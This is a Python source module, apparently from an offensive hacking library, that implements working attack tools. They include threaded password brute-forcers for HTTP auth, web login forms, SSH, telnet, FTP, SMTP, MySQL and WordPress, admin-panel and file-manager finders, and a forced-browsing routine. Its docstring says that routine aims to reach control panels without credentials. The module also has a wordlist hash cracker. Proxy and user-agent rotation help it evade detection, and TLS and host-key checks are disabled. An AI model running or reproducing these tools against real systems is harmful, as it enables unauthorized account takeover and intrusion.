import requests,random,smtplib,telnetlib,sys,os,hashlib,base64,subprocess,time,xtelnet,os,threading
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from ftplib import FTP
from .payloads import *
if os.path.isdir('/data/data')==True:
    adr=True
if os.path.isdir('/data/data/com.termux/')==True:
    termux=True
import mysqlcp
from .pager import *
from .wp import wpadmin
from .hasher import *
from .pager import *

class http_auth_bruteforce:
 __slots__=["logs","stop","finish","result"]
 def __init__(self,u,word_list=[],logs=True,proxy=None,proxies=None,cookie=None,user_agent=None,timeout=10):
  self.stop=False
  self.logs=logs
  self.finish=False
  self.result={}
  t=threading.Thread(target=self.crack,args=(u,word_list,logs,proxy,proxies,cookie,user_agent,timeout,))
  t.daemon=True
  t.start()
 def done(self):
  return self.finish
 def crack(self,u,word_list,logs,proxy,proxies,cookie,user_agent,timeout):
  if user_agent:
   us=user_agent
  else:
   us=random.choice(ua)
  hed={"User-Agent":us}
  if cookie:
   hed.update({"Cookie":cookie})
  prox=None
  if proxy:
   prox={'http':'http://'+proxy}
  if proxies:
   prox=random.choice(proxies)
   prox={'http':'http://'+prox}
  try:
   if self.logs==True:
    print("[*]Checking Authentication Type:")
   resp = requests.get(u,proxies=prox,headers=hed, verify=False, timeout=timeout)
   if 'basic' in resp.headers['WWW-Authenticate'].lower():
    if self.logs==True:    
     print("==>Basic")
    auth_type = requests.auth.HTTPBasicAuth
   elif 'digest' in resp.headers['WWW-Authenticate'].lower():
    if self.logs==True:
     print("==>Digest")
    auth_type = requests.auth.HTTPDigestAuth
   elif 'ntlm' in resp.headers['WWW-Authenticate'].lower():
    if self.logs==True:
     print("==>Ntlm")
    auth_type = requests_ntlm.HttpNtlmAuth
   else:
    if self.logs==True:
     print("==>Unknown type")
    self.finish=True
    return
  except:
   if self.logs==True:
     print("Server doesn't support this type of authentication")
   self.finish=True
   return
  for x in word_list:
   try:
    if self.stop==True:
     self.finish=True
     break
    username=x.split(":")[0]
    password=x.split(":")[1]
    if self.logs==True:
     print("[*]Trying: {} {}".format(username,password))
    prox=None
    if proxy:
     prox={'http':'http://'+proxy}
    if proxies:
     prox=random.choice(proxies)
     prox={'http':'http://'+prox}
    if user_agent:
     us=user_agent
    else:
     us=random.choice(ua)
    hed={"User-Agent":us}
    if cookie:
     hed.update({"Cookie":cookie})
    r=requests.get(u, auth=auth_type(username,password),proxies=prox,headers=hed, verify=False, timeout=timeout)
    if (r.status_code == 200)and("wrong" not in r.text.lower())and("invalid" not in r.text.lower())and("denied" not in r.text.lower())and("unauthorized" not in r.text.lower()):
     if self.logs==True:
      print("[+]Success")
     self.result={u:username+":"+password}
     self.finish=True
     break
    else:
     if self.logs==True:
      print("[-]Fail")
   except:
    if self.logs==True:
     print("[-]Fail")
  self.finish=True
  
def access(u,timeout=10,user_agent=None,cookie=None,bypass=False,proxy=None):
 if bypass==True:
   u+='#'
 if user_agent:
     us=user_agent
 else:
     us=random.choice(ua)
 hed={'User-Agent': us}
 if cookie:
     hed.update({"Cookie":cookie})
 if proxy:
  proxy={'http':'http://'+proxy}
 try:
   r=requests.get(u,  headers = {'User-Agent': random.choice(ua)} , allow_redirects=False,proxies=proxy,timeout=timeout, verify=False) 
   if r.status_code == requests.codes.ok:
    if (("Uncaught exception" not in r.text) or ("404 Not Found" not in r.text)):
     return True
 except Exception as e:
   pass
 return False

class web_login_bruteforce:
 __slots__=["stop","finish","result","logs"]
 def try_combo(self,url,username,password,cookie,user_agent,proxy,timeout):
  cookies=None
  h={"User-Agent":user_agent}
  if cookie:
   h.update({"Cookie":cookie})
   cookies=cookie
  try:
   r=requests.get(url,proxies=proxy,headers=h, verify=False, timeout=timeout)
  except:
   return False
  cook=None
  try:
   cook=r.headers['Set-cookie']
  except:
   pass
  if cook:
   if cookies:
    cookies+=" ; "+cook
   else:
    cookies=cook
  form=set_login_form(url, r.text.encode('utf-8','ignore'), username, password)
  h={"User-Agent":user_agent}
  if cookies:
   h.update({"Cookie":cookies})
  d=form[0]
  print(d)
  try:
   r=requests.post(form[1],data=d,headers=h,verify=False,proxies=proxy, timeout=timeout)
  except:
   return False
  try:
   set_login_form(url, r.text.encode('utf-8','ignore'), username, password)
   return False
  except:
   return True
  
 def __init__(self,u,word_list=[],logs=True,proxy=None,proxies=None,cookie=None,user_agent=None,timeout=10):
  self.stop=False
  self.finish=False
  self.logs=logs
  self.result={}
  t=threading.Thread(target=self.crack,args=(u,word_list,logs,proxy,proxies,cookie,user_agent,timeout,))
  t.daemon=True
  t.start()
 def done(self):
  return self.finish
 def crack(self,u,word_list,logs,proxy,proxies,cookie,user_agent,timeout):
  for x in word_list:
   try:
    if self.stop==True:
     self.finish=True
     break
    username=x.split(":")[0]
    password=x.split(":")[1]
    if self.logs==True:
     print("[*]Trying: {} {}".format(username,password))
    if user_agent:
     us=user_agent
    else:
     us=random.choice(ua)
    prox=None
    if proxy:
     prox=proxy
    if proxies:
     prox=random.choice(proxies)
    if self.try_combo(u,username,password,cookie,us,prox,timeout)==True:
     if self.logs==True:
      print("[+]Success")
     self.result={u:username+":"+password}
     self.finish=True
     break
    else:
     if self.logs==True:
      print("[-]Fail")
   except Exception as e:
    print(e)
    if self.logs==True:
     print("[-]Fail")
  self.finish=True


class filemanager_finder:
 __slots__=["logs","stop","finish","result"]
 def __init__(self,u,logs=True,user_agent=None,cookie=None,timeout=10,proxy=None,proxies=None):
  '''
   u: the link: http://www.example.com
   logs: (set by default to True) the show the process and requests
   mapping: (set by default to: False) if it is set to True, it will stop the prcess when it finds the link, else: it continue for more
   possible links
   returning: (set by default to: False) if you want it to return a list of possibly accesseble links to be used in your scripts set it to: True
   timeout: (set by default to 10) timeout flag for the requests   

   usage:

   >>>import bane
   >>>url='http://www.example.com/'
   >>>bane.filemanager_finder(url)
   '''
  self.logs=logs
  self.stop=False
  self.finish=False
  self.result={}
  t=threading.Thread(target=self.crack,args=(u,logs,user_agent,cookie,timeout,proxy,proxies,))
  t.daemon=True
  t.start()
 def crack(self,u,logs,user_agent,cookie,timeout,proxy,proxies):
  for i in manager:
   if self.stop==True:
    self.finish=True
    break
   if proxy:
    proxy={'http':'http://'+proxy}
   if proxies:
    proxy={'http':'http://'+random.choice(proxies)}
   if user_agent:
     us=user_agent
   else:
     us=random.choice(ua)
   hed={'User-Agent': us}
   if cookie:
     hed.update({"Cookie":cookie})
   try:
    if u[len(u)-1]=='/':
     u=u[0:len(u)-1]
    g=u+i
    r=requests.get(g,  headers = hed , allow_redirects=False,proxies=proxy,timeout=timeout, verify=False) 
    if r.status_code == requests.codes.ok:
     if ("Uncaught exception" not in r.text) and ("404 Not Found" not in r.text) and ('could not be found' not in r.text):
       self.finish=True
       if self.logs==True:
        sys.stdout.write("\rStats: {}/{} | Found: {}  ".format(manager.index(g),len(manager),self.finish))
        sys.stdout.flush()
       self.result.update({u:g})
       break
     else:
        if self.logs==True:
         sys.stdout.write("\rStats: {}/{} | Found: {}  ".format(manager.index(g),len(manager),self.finish))
         sys.stdout.flush()
    else:
     if self.logs==True:
        sys.stdout.write("\rStats: {}/{} | Found: {}  ".format(manager.index(g),len(manager),self.finish))
        sys.stdout.flush()
   except KeyboardInterrupt:
    break
   except Exception as e:
    pass
  self.finish=True
 def done(self):
  return self.finish 

class force_browsing:
 __slots__=["stop","finish","result","logs"]
 def __init__(self,u,timeout=10,logs=True,ext='php',user_agent=None,cookie=None,proxy=None,proxies=None):
  '''
   this function is using "Forced Browsing" technique which is aim to access restricted areas without providing any credentials!!!
   it is used here to gain access to admin control panel by trying different possible combinations of links with the given URL.
   it's possible to do that and this a proof of concept that unserured cpanels with lack of right sessions configurations can be
   accessed just by guessing the right links :)

   the function takes those arguments:
   
   u: the targeted link which should be leading to the control panel, example:
   http://www.example.com/admin/login.php
   you have to delete 'login.php' and insert the rest of the link in the function like this:
   
   >>>import bane
   >>>bane.force_browsing('http://www.example.com/admin/')

   then the function will try to find possible accesseble links:

   http://www.example.com/admin/edit.php
   http://www.example.com/admin/news.php
   http://www.example.com/admin/home.php

   timeout: (set by default to 10) timeout flag for the request
   logs: (set by default to: True) showing the process of the attack, you can turn it off by setting it to: False
   returning: (set by default to: False) return a list of the accessible link(s), to make the function return the list, set to: True
   mapping: (set by default to: True) find all possible links, to make stop if it has found 1 link just set it to: False
   ext: (set by default to: "php") it helps you to find links with the given extention, cuurentky it supports only 3 extentions: "php", "asp"
   and "aspx"( any other extention won't be used).  
'''
  self.stop=False
  self.finish=False
  self.result={}
  self.logs=logs
  t=threading.Thread(target=self.crack,args=(u,timeout,logs,ext,user_agent,cookie,proxy,proxies,))
  t.daemon=True
  t.start()
 def crack(self,u,timeout=10,logs=True,ext='php',user_agent=None,cookie=None,proxy=None,proxies=None):
  l=[]
  if u[len(u)-1]=='/':
    u=u[0:len(u)-1]
  for x in innerl:
   if self.stop==True:
    break
   g=u+x+'.'+ext
   if self.logs==True:
    print("[*]Trying:",g)
   try:
    if proxy:
     proxy=proxy
    if proxies:
     proxyrandom.choice(proxies)
    if user_agent:
      us=user_agent
    else:
     us=random.choice(ua)
    h=access(g,user_agent=us,cookie=cookie,proxy=proxy)
   except KeyboardInterrupt:
    break
   if h==True:
    l.append(g)
    if self.logs==True:
     print("[+]FOUND!!!")
   else:
    if self.logs==True:
     print("[-]Failed")
  self.result={u:l}
  self.finish=True
 def done(self):
  return  self.finish

class admin_panel_finder:
 __slots__=["stop","finish","result","logs"]
 def done(self):
  return  self.finish 
 '''
   this function use a list of possible admin panel links with different extensions: php, asp, aspx, js, /, cfm, cgi, brf and html.
   
   ext: (set by default to: 'php') to define the link's extention.

   usage:

  >>>import bane
  >>>bane.admin_panel_finder('http://www.example.com',ext='php',timeout=7)

  >>>bane.admin_panel_finder('http://www.example.com',ext='aspx',timeout=5)
 '''
 def __init__(self,u,logs=True,user_agent=None,cookie=None,ext='php',timeout=10,proxy=None,proxies=None):
  self.logs=logs
  self.stop=False
  self.finish=False
  self.result={}
  t=threading.Thread(target=self.crack,args=(u,timeout,logs,ext,user_agent,cookie,proxy,proxies,))
  t.daemon=True
  t.start()
 def crack(self,u,timeout=10,logs=True,ext='php',user_agent=None,cookie=None,proxy=None,proxies=None):
  links=[]
  ext=ext.strip()
  if ext.lower()=="php":
   links=phpl
  elif ext.lower()=="asp":
   links=aspl
  elif ext.lower()=="aspx":
   links=aspxl
  elif ext.lower()=="js":
   links=jsl
  elif ext=="/":
   links=slashl
  elif ext.lower()=="cfm":
   links=cfml
  elif ext.lower()=="cgi":
   links=cgil
  elif ext.lower()=="brf":
   links=brfl
  elif ext.lower()=="html":
   links=htmll
  k=[]
  for i in links:
   if self.stop==True:
    break
   try:
    if proxy:
     proxy={'http':'http://'+proxy}
    if proxies:
     proxy={'http':'http://'+random.choice(proxies)}
    if user_agent:
     us=user_agent
    else:
     us=random.choice(ua)
    hed={'User-Agent': us}
    if cookie:
     hed.update({"Cookie":cookie})
    if u[len(u)-1]=='/':
     u=u[0:len(u)-1]
    g=u+i
    if self.logs==True:
     print("[*]Trying:",g)
    r=requests.get(g,headers = hed,allow_redirects=False,proxies=proxy,timeout=timeout, verify=False) 
    if r.status_code == requests.codes.ok:
     if self.logs==True:
      print("[+]FOUND!!!")
     k.append(g)
    else:
     if self.logs==True:
      print("[-]failed")
   except KeyboardInterrupt:
    break
   except Exception as e:
    if self.logs==True:
     print ("[-]Failed")
  self.result={u:k}
  self.finish=True
'''
  the next functions are used to check the login credentials you provide, it can be used for bruteforce attacks.

  it returns True if the given logins, else it returns False.

  example:

  >>>host='125.33.32.11'
  >>>wordlist=['admin:admin','admin123:admin','user:password']
  >>>for x in wordlist:
      user=x.split(':')[0]
      pwd=x.split(':')[1]
      print '[*]Trying:',user,pwd
      if bane.telnet(host,username=user,password=pwd)==True:
       print'[+]Found!!!'
      else:
       print'[-]Failed'

'''
def smtp(u, username,password,p=25,ehlo=True,helo=False,ttls=False):
 try:
  s= smtplib.SMTP(u, p)#connect to smtp server
  if ehlo==True:
   s.ehlo()#ehlo
   if ttls==True:
    s.starttls()#ttls
  if helo==True:
   s.helo()#helo
   if ttls==True:
    s.starttls()
  s.login(username, password)
  return True
 except Exception as e:
  pass
 return False

def telnet(u,username,password,p=23,timeout=5):
 try:
  t=xtelnet.session()
  t.connect(u,username=username,password=password,p=p,timeout=timeout)
  t.destroy()
  return True
 except:
  pass
 return False

#why i used this code for ssh brute force instead of: pexpext/paramiko ? Well pexpect doesn't work on non-linux machines and paramiko gives a huuuuge numer of false positive results ! you will see, with this code there is no false positive brute force ;)

def ssh(u,username,password,p=22,timeout=5,exchange_key=None):
 if os.name == 'nt':
  if exchange_key!=None:#this doesn't work on windows for some reason :(
   return False
  l='echo y | plink -ssh -l {} -pw {} {} -P {} "hvbjkjk"'.format(username,password,u,p)
  sshp = subprocess.Popen(l.split(),stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
 else:
  if exchange_key:
   key="-oHostKeyAlgorithms=+"+exchange_key
  else:
   key=""
  l="sshpass -p {} ssh {} -p {} -o StrictHostKeyChecking=no -l {} {} 'exithg'".format(password,key,p,username,u) #we use the sshpass command to send the password
  sshp = subprocess.Popen(l.split(),stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
 ti=time.time()
 while sshp.poll() is None:
   time.sleep(.1)
   #print(ssh.stdout.readlines())
   if int(time.time()-ti)==timeout:
       try:
        sshp.kill()
       except:
        pass
       return False
 ou=sshp.communicate()
 try:
   sshp.kill()
 except:
   pass
 time.sleep(0.1)
 if exchange_key==None:
  if "Their offer:" in ou[1].decode("utf-8") :
   if os.name == 'nt':
    return False
   k=ou[1].decode("utf-8").split("offer:")[1].strip()
   return ssh(u,username,password,p=p,timeout=timeout,exchange_key=k)
 if "Server refused to start a shell/command" in ou[1].decode("utf-8"):
  return True
 if (( "unsupported" in ou[1].decode("utf-8").lower() )or( "denied" in ou[1].decode("utf-8").lower() )or("FATAL ERROR" in ou[1].decode("utf-8")) or ("refused" in ou[1].decode("utf-8").lower()) or ("Unsupported KEX algorithm" in ou[1].decode("utf-8")) or ("Bad SSH2 KexAlgorithms" in ou[1].decode("utf-8")) ):
  return False
 else:
  return True

  
def ftp_anon(ip,timeout=5):
  #anonymous ftp login
  try:
    ftp = FTP(ip,timeout=timeout)
    ftp.login()
    return True
  except Exception as e:
    pass
  return False
def ftp(ip,username,password,timeout=5):
   try:
    i=False
    ftp = FTP(ip,timeout=timeout)
    ftp.login(username,password)
    return True
   except Exception as e:
    pass
   return False
def mysql(u,username,password,timeout=5,p=3306):
 try:
  s=mysqlcp.session(u,username,password,timeout=timeout,port=p)
  s.destroy()
  return True
 except Exception as e:
  pass
 return False
class hydra:
 __slots__=["stop","finish","result","logs"]
 def __init__(self,u,p=22,protocol="ssh",word_list=[],logs=True,exchange_key=None,timeout=5,ehlo=False,helo=True,ttls=False,proxy=None,proxies=None):
  '''
   this function is similar to hydra tool to bruteforce attacks on different ports.

   protocol: (set by default to: ssh) set the chosen protocol (ftp, ssh, telnet, smtp and mysql) and don't forget to set the port.
'''
  self.logs=logs
  self.stop=False
  self.finish=False
  self.result={}
  t=threading.Thread(target=self.crack,args=(u,p,protocol,word_list,logs,exchange_key,timeout,ehlo,helo,ttls,proxy,proxies,))
  t.daemon=True
  t.start()
 def crack(self,u,p,protocol,word_list,logs,exchange_key,timeout,ehlo,helo,ttls,proxy,proxies):
  o=''
  if protocol=="telnet":
     s=telnet
  if protocol=="ssh":
   s=ssh
  if protocol=="ftp":
   s=ftp
  if protocol=="smtp":
   s=smtp
  if protocol=="mysql":
   s=mysql
  if protocol=="wp":
   s=wpadmin
  for x in word_list:
   if self.stop==True:
    break
   user=x.split(':')[0].strip()
   pwd=x.split(':')[1].strip()
   if self.logs==True:
    print("[*]Trying ==> {}:{}".format(user,pwd))
   if protocol=="ssh":
    r=s(u,user,pwd,timeout=timeout,p=p,exchange_key=exchange_key)
   elif protocol=="telnet":
    r=s(u,user,pwd,timeout=timeout,p=p)
   elif (protocol=="mysql"):
    r=s(u,user,pwd,timeout=timeout,p=p)
   elif (protocol=="ftp"):
    r=s(u,user,pwd,timeout=timeout)
   elif (protocol=="wp"):
    if proxy:
     proxy=proxy
    if proxies:
     proxy=random.choice(proxies)
    r=s(u,user,pwd,proxy=proxy,user_agent=user_agent,cookie=cookie,timeout=timeout)
   elif (protocol=="smtp"):
    r=s(u,p,user,pwd,ehlo=ehlo,helo=helo,ttls=ttls)
   else:
    r=s(u,user,pwd,timeout=timeout)
   if r==True:
    if self.logs==True:
     print("[+]Found!!!")
    o="{}:{}".format(user,pwd)
    break
   else:
    if self.logs==True:
     print("[-]Failed")
  self.result={u:o}
  self.finish=True

class decrypt:
 __slots__=["stop","finish","result","logs"]
 def __init__(self,u,word_list=[],md5_hash=False,sha1_hash=False,sha256_hash=False,sha224_hash=False,sha384_hash=False,sha512_hash=False,base64_hash=False,caesar_hash=False,logs=False):
  self.logs=logs
  self.stop=False
  self.finish=False
  self.result={}
  t=threading.Thread(target=self.crack,args=(u,word_list,md5_hash,sha1_hash,sha256_hash,sha224_hash,sha384_hash,sha512_hash,base64_hash,caesar_hash,logs,))
  t.daemon=True
  t.start()
 def crack(self,u,word_list,md5_hash,sha1_hash,sha256_hash,sha224_hash,sha384_hash,sha512_hash,base64_hash,caesar_hash,logs):
  if self.logs==True:
   print('[!]hash: '+u+'\nbruteforcing has started!!!\n')
  for x in word_list:
   if self.stop==True:
    break
   if md5_hash==True:
    if dmd5(x,u)==True:
     if self.logs==True:
      print("[+]Hash match found: "+x+" | Type: md5")
     self.result={u:["md5:"+x]}
     break
   if sha1_hash==True:
    if dsha1(x,u)==True:
     if self.logs==True:
      print("[+]Hash match found: "+x+" | Type: sha1")
     self.result={u:["sha1:"+x]}
     break
   if sha256_hash==True:
    if dsha256(x,u)==True:
     if self.logs==True:
      print("[+]Hash match found: "+x+" | Type: sha256")
     self.result={u:["sha256:"+x]}
     break
   if sha224_hash==True:
    if dsha224(x,u)==True:
     if self.logs==True:
      print("[+]Hash match found: "+x+" | Type: sha224")
     self.result={u:["sha224:"+x]}
     break
   if sha384_hash==True:
    if dsha384(x,u)==True:
     if self.logs==True:
      print("[+]Hash match found: "+x+" | Type: sha384")
     self.result={u:["sha384:"+x]}
     break
   if sha512_hash==True:
    if dsha512(x,u)==True:
     if self.logs==True:
      print("[+]Hash match found: "+x+" | Type: sha512")
     self.result={u:["sha512:"+x]}
     break
   if base64_hash==True:
    if base64decode(x)==u:
     if self.logs==True:
      print("[+]Hash match found: "+x+" | Type: base64")
     self.result={u:["base64:"+x]}
     break
   if caesar_hash==True:
    for i in range(1,27):
     if dcaesar(x,i)==True:
      if self.logs==True:
       print("[+]Hash match found: "+x+" | Type: caesar | Key: "+str(i))
      self.result={u:["caesar"+str(i)+":"+x]}
      break
  if self.result=={}:
   if self.logs==True:
    print('[-]No match found')
  self.finish=True
 def done(self):
  return self.finish